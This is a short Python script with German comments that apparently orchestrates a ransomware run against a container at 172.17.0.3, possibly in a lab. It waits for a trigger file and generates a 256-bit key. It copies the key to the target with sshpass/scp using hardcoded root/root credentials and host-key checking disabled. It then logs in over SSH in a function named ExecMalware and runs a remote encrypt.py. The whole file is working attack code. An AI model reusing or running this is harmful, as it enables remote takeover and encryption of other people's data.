import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
from cryptography.hazmat.backends import default_backend
import os
import time
import paramiko

def ExecMalware():

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect('172.17.0.3', username="root", password="root")

    time.sleep(1)
    stdin, stdout, stderr = client.exec_command('cd ../ && python3 encrypt.py')


    for line in stdout:
        print(line)

    client.close()






def wait_for_file(file_path, timeout=60):
    start_time = time.time()
    while not os.path.exists(file_path):
        if time.time() - start_time >= timeout:
            print("Timeout: Datei wurde nicht gefunden.")
            return False
        time.sleep(1)  # Warten Sie 1 Sekunde, bevor Sie erneut überprüfen

    print("Datei gefunden:", file_path)
    # Führen Sie hier Ihre gewünschte Aktion aus
    print("erzeuge schlüssel")
    time.sleep(3)
    print("---------")


    key = os.urandom(32)  # Erzeuge einen zufälligen 256-Bit-Schlüssel

    with open("chkey.txt", "wb") as keyfile:
        keyfile.write(key)
    
    print("schlüssel erzeugt")
    time.sleep(3)
    print("sende schlüssel")
    ostring = "sshpass -p " + "root"  +  " scp -o StrictHostKeyChecking=no chkey.txt "+ "root"+"@172.17.0.3:/root/../"
    os.system(ostring)
    
    #ostring = "sshpass -p " + "root"  +  " scp -o StrictHostKeyChecking=no decrypt.txt "+ "root"+"@172.17.0.3:/root"
    time.sleep(5)
    print("Führe verschlüsselung durch")
    ExecMalware()


# Beispielaufruf
file_path = "/kenndaten.txt"
wait_for_file(file_path, timeout=120)





